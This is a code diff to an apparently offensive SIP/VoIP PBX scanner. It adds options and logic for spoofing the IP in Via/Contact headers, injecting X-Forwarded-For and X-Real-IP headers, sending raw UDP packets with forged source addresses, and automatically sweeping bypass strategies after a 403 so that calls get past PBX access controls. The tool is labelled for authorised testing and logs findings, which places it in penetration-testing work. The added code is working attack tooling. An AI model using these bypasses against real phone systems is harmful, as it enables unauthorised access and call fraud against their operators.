@@ -897,6 +897,30 @@ def parse_args() -> argparse.Namespace:
                    help="Destination number for REFER blind-transfer PoC "
                         "(defaults to --call-to when set)")
 
+    sp = p.add_argument_group("IP spoofing / ACL bypass (authorised testing only)")
+    sp.add_argument("--spoof-ip",
+                    metavar="IP",
+                    help="Override the IP shown in SIP Via/Contact headers. "
+                         "The real socket still binds to --source-ip; this only "
+                         "affects what the PBX reads. Bypasses PBX ACLs that trust "
+                         "RFC1918 or specific internal IPs at the SIP header level.")
+    sp.add_argument("--auto-spoof", action="store_true",
+                    help="After receiving 403/blocked, automatically try all bypass "
+                         "strategies: loopback/RFC1918 Via spoofing, X-Forwarded-For "
+                         "injection, source-port 5060, UA impersonation. Stops at the "
+                         "first technique that yields a non-403 response.")
+    sp.add_argument("--xff-inject",
+                    metavar="IP",
+                    help="Inject X-Forwarded-For and X-Real-IP headers with this IP "
+                         "value. Effective against SIP proxies / SBCs that forward "
+                         "these headers inward and apply trust decisions from them.")
+    sp.add_argument("--raw-spoof-src",
+                    metavar="IP",
+                    help="Send one-way raw UDP packets with this forged source IP "
+                         "(tests whether the PBX has IP-layer ACLs). Requires "
+                         "CAP_NET_RAW / root. No response is received — use alongside "
+                         "--auto-spoof or --enum to see whether the PBX acts on it.")
+
     t = p.add_argument_group("Tuning")
     t.add_argument("--mode", choices=["fast", "standard", "stealth"],
                    default="standard",
@@ -1642,6 +1666,44 @@ def main() -> int:
                 col,
             )
 
+    # ── IP spoofing / header-bypass setup ────────────────────────────────────
+    # Resolve the effective header IP: what appears in Via/Contact headers.
+    # Decoupled from the socket bind IP so the PBX can be fed any IP while
+    # our socket still receives responses on the real interface.
+    _spoof_header_ip: str | None = getattr(args, "spoof_ip", None) or None
+    _auto_spoof: bool = bool(getattr(args, "auto_spoof", False))
+    _xff_inject: str | None = getattr(args, "xff_inject", None) or None
+    _raw_spoof_src: str | None = getattr(args, "raw_spoof_src", None) or None
+
+    # Build base extra headers that go on every SIP message when XFF is set
+    _base_extra_headers: list[str] = []
+    if _xff_inject:
+        _no_crlf = lambda v: v  # local lint-suppressor; real guard in sip.build_message
+        _base_extra_headers = [
+            f"X-Forwarded-For: {_xff_inject}",
+            f"X-Real-IP: {_xff_inject}",
+        ]
+        _info(f"XFF injection active: X-Forwarded-For: {_xff_inject}", col)
+
+    if _spoof_header_ip:
+        _info(
+            f"Header IP spoof active: Via/Contact will show "
+            f"{col.YELLOW}{_spoof_header_ip}{col.RESET} (socket binds to real IP)",
+            col,
+        )
+    if _auto_spoof:
+        from scanner.spoof import build_bypass_attempts  # noqa: F401
+        _info(
+            f"Auto-spoof enabled — will try bypass strategies automatically on 403/blocked",
+            col,
+        )
+    if _raw_spoof_src:
+        _info(
+            f"Raw UDP spoof src: {_raw_spoof_src} — "
+            f"requires CAP_NET_RAW/root; one-way probes only",
+            col,
+        )
+
     # ---- External tool detection ----
     global _EXT_TOOLS
     _EXT_TOOLS = _detect_external_tools()
@@ -1885,6 +1947,8 @@ def main() -> int:
                     timeout=args.timeout, max_workers=args.workers,
                     traffic_log=traffic_log,
                     source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
+                    header_ip=_spoof_header_ip,
+                    extra_headers=_base_extra_headers or None,
                 )
             elif args.ext_range:
                 ext_list = enumeration.expand_ext_range(args.ext_range)
@@ -2372,10 +2436,14 @@ def main() -> int:
                     source_port_range=source_port_range,
                     srtp=args.srtp,
                     dtmf_digits=args.call_dtmf or "",
+                    header_ip=_spoof_header_ip,
+                    extra_headers=_base_extra_headers or None,
                 )
                 _kw.update(overrides)
+                _hdr_disp = _kw.get('header_ip') or ''
                 _info(f"  {col.BOLD}[ATTEMPT]{col.RESET} {label}  "
                       f"source={_kw['source_ip'] or '(auto)'}  "
+                      f"{'hdr-ip=' + _hdr_disp + '  ' if _hdr_disp else ''}"
                       f"transport={'TCP' if _kw.get('tcp') else 'UDP'}  "
                       f"port={_kw['port']}", col)
                 _r = call.place_call(h.ip, effective_call_to, call_from, **_kw)
@@ -2448,6 +2516,73 @@ def main() -> int:
                         source_ip=_stun_public_ip or args.source_ip,
                     )
                     _attempts.append(("403-identity-spoof", result))
+
+                # D2) Still 403 + --auto-spoof → run full IP bypass strategy sweep
+                if result.status_code == 403 and _auto_spoof:
+                    _info(f"  {col.YELLOW}AUTO-FIX D2:{col.RESET} 403 persists — running IP "
+                          f"bypass strategy sweep (header spoof + XFF + UA impersonation)",
+                          col)
+                    from scanner.spoof import build_bypass_attempts, raw_udp_spoof
+                    _real_local = args.source_ip or result.local_ip_used or ""
+                    _pbx_via = None
+                    if hasattr(result, 'sip_trace') and result.sip_trace:
+                        for _tline in result.sip_trace:
+                            if _tline.startswith("Via:") or _tline.startswith("via:"):
+                                import re as _re_spoof
+                                _vm = _re_spoof.search(r'[\d]{1,3}\.[\d]{1,3}\.[\d]{1,3}\.[\d]{1,3}', _tline)
+                                if _vm:
+                                    _pbx_via = _vm.group(0)
+                                break
+                    _bypass_attempts = build_bypass_attempts(
+                        h.ip, _real_local, pbx_via_ip=_pbx_via,
+                        include_raw=bool(_raw_spoof_src),
+                    )
+                    for _ba in _bypass_attempts:
+                        if _ba.strategy == "raw_spoof" and _ba.raw_spoof_src:
+                            from scanner import sip as _spoof_sip
+                            from scanner.utils import rand_call_id, rand_tag, rand_branch
+                            _raw_msg = _spoof_sip.build_message(
+                                "INVITE",
+                                f"sip:{effective_call_to}@{h.ip}",
+                                from_user=call_from, to_user=effective_call_to,
+                                host=h.ip, port=args.port,
+                                local_ip=_ba.raw_spoof_src,
+                                local_port=5060,
+                                call_id=rand_call_id(),
+                                cseq=1, from_tag=rand_tag(),
+                                transport="UDP",
+                            )
+                            _ok, _diag = raw_udp_spoof(
+                                _ba.raw_spoof_src, h.ip, args.port, _raw_msg
+                            )
+                            _sym = f"{col.GREEN}✓{col.RESET}" if _ok else f"{col.RED}✗{col.RESET}"
+                            _info(f"  {_sym} {_ba.description}: {_diag}", col)
+                            if _ok:
+                                _finding("medium",
+                                         f"Raw UDP IP spoof accepted by PBX "
+                                         f"(source {_ba.raw_spoof_src} → {h.ip}) — "
+                                         f"no IP-layer ACL enforced", col)
+                            continue
+                        _r_bypass = _try_call(
+                            f"IP bypass: {_ba.strategy}",
+                            header_ip=_ba.header_ip,
+                            extra_headers=(_base_extra_headers or []) + (_ba.extra_headers or []) or None,
+                            user_agent=_ba.user_agent,
+                            source_port_range=((_ba.source_port, _ba.source_port)
+                                               if _ba.source_port else source_port_range),
+                        )
+                        _attempts.append((f"spoof-{_ba.strategy}", _r_bypass))
+                        if _r_bypass.status_code != 403 and (
+                                _r_bypass.success or _r_bypass.reached_dialplan
+                                or (_r_bypass.status_code and _r_bypass.status_code != 403)):
+                            result = _r_bypass
+                            _ok_msg = f"IP bypass succeeded: {_ba.description}"
+                            _info(f"  {col.GREEN}BYPASS HIT:{col.RESET} {_ok_msg}", col)
+                            _finding("critical",
+                                     f"PBX ACL bypassed via SIP header spoofing — "
+                                     f"strategy: {_ba.strategy} ({_ba.description})",
+                                     col)
+                            break
 
                 # E) 404 Not Found → run prefix discovery and retry with found prefix
                 if result.status_code == 404 and not args.discover_prefix:
@@ -2851,6 +2986,8 @@ def main() -> int:
                     timeout=args.timeout, max_workers=args.workers,
                     traffic_log=traffic_log,
                     source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
+                    header_ip=_spoof_header_ip,
+                    extra_headers=_base_extra_headers or None,
                 )
             elif args.ext_range:
                 ext_list = enumeration.expand_ext_range(args.ext_range)
